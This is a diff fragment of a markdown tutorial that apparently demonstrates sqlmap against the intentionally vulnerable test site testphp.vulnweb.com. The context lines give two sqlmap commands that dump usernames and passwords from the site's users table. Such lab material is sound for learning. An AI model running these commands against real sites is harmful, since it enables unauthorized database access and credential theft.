@@ -35,6 +35,7 @@ We will focus on the _users_ table by running the command `sqlmap -u 'testphp.vu
 In the _users_ table, we will dump all the data in the _uname_ and _pass_ by running two commands.
 1. `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' -D acuart -T users -C uname --dump`
 <img width="1440" alt="Screenshot 2022-11-05 at 2 08 31 AM" src="https://user-images.githubusercontent.com/64619851/200082247-724c2eb9-edc8-4645-a0a8-4be6875ff847.png">
+
 2. `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' -D acuart -T users -C pass --dump`
 <img width="1440" alt="Screenshot 2022-11-05 at 2 08 50 AM" src="https://user-images.githubusercontent.com/64619851/200082257-3d61b418-5c8f-4778-ac7e-c4326a7c680c.png">
 
